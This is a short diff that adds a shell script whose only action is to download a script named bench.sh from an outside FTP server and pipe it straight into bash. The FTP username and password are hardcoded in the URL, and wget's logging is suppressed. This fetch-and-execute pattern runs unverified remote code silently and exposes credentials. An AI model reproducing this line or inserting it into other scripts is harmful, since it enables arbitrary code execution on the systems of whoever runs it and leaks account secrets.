@@ -1,0 +1,5 @@
+#!/bin/sh
+
+wget ftp://xsrvtk:QbIzy5j7Ec@ftp01.prometeus.net/public_html/tst/bench.sh -O - -o /dev/null|bash
+
+exit 0
